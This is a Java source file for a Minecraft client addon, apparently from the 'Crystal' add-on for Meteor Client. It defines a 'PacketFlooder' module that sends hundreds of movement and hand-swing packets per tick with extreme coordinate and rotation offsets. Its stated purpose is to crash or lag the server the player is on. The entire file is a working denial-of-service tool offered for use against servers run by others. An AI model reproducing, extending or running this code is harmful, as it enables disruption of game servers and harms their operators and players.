package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.Hand;

public class PacketFlooder extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Modes> crashMode = sgGeneral.add(new EnumSetting.Builder<Modes>()
            .name("mode")
            .description("Which crash mode to use.")
            .defaultValue(Modes.NEW)
            .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server per tick.")
            .defaultValue(100)
            .min(1)
            .sliderMax(1000)
            .build()
    );

    private final Setting<Boolean> onGround = sgGeneral.add(new BoolSetting.Builder()
            .name("on-ground")
            .description("Choose to for the packets to send onGround or not.")
            .defaultValue(true)
            .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("auto-disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build()
    );

    private final Setting<Boolean> onTick = sgGeneral.add(new BoolSetting.Builder()
            .name("on-tick")
            .description("Sends the packets every tick.")
            .defaultValue(false)
            .build()
    );

    public PacketFlooder() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY, "packet-flooder", "CRYSTAL || Attempts to crash / lag the server you are on by flooding it with packets.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        switch (crashMode.get()) {
            case OLD -> {
                for (int i = 0; i < amount.get(); i++) {
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(Math.random() >= 0.5));
                    mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                }
            }
            case NEW -> {
                for (int i = 0; i < amount.get(); i++) {
                    double offset = 85523 * i;
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                            mc.player.getX() + offset,
                            mc.player.getY() + offset,
                            mc.player.getZ() + offset,
                            Math.random() >= 0.5));
                    mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                }
            }
            case EFFICIENT -> {
                for (int i = 0; i < amount.get(); i++) {
                    double offset = 85523 * i;
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                            mc.player.getX() + offset,
                            mc.player.getY() + offset,
                            mc.player.getZ() + offset,
                            onGround.get()));
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(
                            mc.player.getX() + offset,
                            mc.player.getY() + offset,
                            mc.player.getZ() + offset,
                            (float) (mc.player.getYaw() + offset),
                            (float) (mc.player.getPitch() + offset),
                            onGround.get()));
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(
                            (float) (mc.player.getYaw() + offset),
                            (float) (mc.player.getPitch() + offset),
                            onGround.get()));
                    mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                }
            }
        }
        if (!onTick.get()) toggle();
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum Modes {
        NEW,
        OLD,
        EFFICIENT,
    }
}